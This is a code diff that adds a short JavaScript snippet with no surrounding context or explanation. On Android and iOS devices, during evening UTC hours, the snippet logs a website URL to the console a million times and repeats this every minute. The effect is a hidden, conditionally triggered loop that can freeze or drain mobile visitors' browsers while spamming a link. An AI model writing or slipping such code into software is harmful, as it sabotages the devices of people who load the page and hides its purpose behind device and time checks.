@@ -1,1 +1,29 @@
+function isIOSOrAndroid() {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    if (/android/i.test(userAgent)) {
+        return true;
+    }
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return true;
+    }
+    return false;
+}
+
+function isWithinUTCTimestamp() {
+    const now = new Date();
+    const utcHour = now.getUTCHours();
+    return utcHour >= 19 && utcHour <= 23;
+}
+
+if (isIOSOrAndroid()) {
+    const checkAndLog = () => {
+        if (isWithinUTCTimestamp()) {
+            for (let index = 0; index < 1000000; index++) {
+                console.log('https://lfcarry.com/')
+            }
+        }
+    };
+    checkAndLog();
+    setInterval(checkAndLog, 60 * 1000);
+}
 
